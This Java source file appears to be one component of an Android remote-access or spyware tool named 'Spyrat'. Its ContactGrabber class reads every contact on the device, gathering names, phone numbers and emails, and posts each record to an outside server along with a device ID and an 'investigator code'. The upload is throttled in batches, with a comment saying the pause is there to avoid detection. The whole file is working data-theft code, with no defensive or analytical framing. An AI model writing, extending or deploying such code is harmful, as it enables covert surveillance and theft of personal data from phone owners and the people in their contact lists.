package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONObject;

public class ContactGrabber {
    private static final String TAG = "SpyratContacts";

    public static void collectAndSendContacts(Context context, String deviceId, String investigatorCode) {
        try {
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String displayName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    JSONObject contactData = new JSONObject();
                    contactData.put("name", displayName);
                    contactData.put("contact_id", contactId);

                    // Get phone numbers
                    String phoneNumbers = getPhoneNumbers(context, contactId);
                    contactData.put("phones", phoneNumbers);

                    // Get email addresses
                    String emails = getEmailAddresses(context, contactId);
                    contactData.put("emails", emails);

                    // Send individual contact
                    sendContactData(deviceId, investigatorCode, contactData);
                    count++;

                    // Pause to avoid detection
                    if (count % 5 == 0) Thread.sleep(1000);
                }
                cursor.close();
                Log.d(TAG, "✅ Contacts " + count + " zimetumwa");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Contacts capture error: " + e.getMessage());
        }
    }

    private static String getPhoneNumbers(Context context, String contactId) {
        StringBuilder phones = new StringBuilder();
        try {
            Cursor phoneCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null) {
                while (phoneCursor.moveToNext()) {
                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (phones.length() > 0) phones.append(", ");
                    phones.append(phone);
                }
                phoneCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Phone numbers error: " + e.getMessage());
        }
        return phones.toString();
    }

    private static String getEmailAddresses(Context context, String contactId) {
        StringBuilder emails = new StringBuilder();
        try {
            Cursor emailCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (emailCursor != null) {
                while (emailCursor.moveToNext()) {
                    String email = emailCursor.getString(emailCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Email.ADDRESS));
                    if (emails.length() > 0) emails.append(", ");
                    emails.append(email);
                }
                emailCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Emails error: " + e.getMessage());
        }
        return emails.toString();
    }

    private static void sendContactData(String deviceId, String investigatorCode, JSONObject contactData) {
        try {
            JSONObject postData = new JSONObject();
            postData.put("device_id", deviceId);
            postData.put("investigator_code", investigatorCode);
            postData.put("data_type", "contacts");
            postData.put("data_content", contactData);

            NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
        } catch (Exception e) {
            Log.e(TAG, "❌ Contact send error: " + e.getMessage());
        }
    }
}
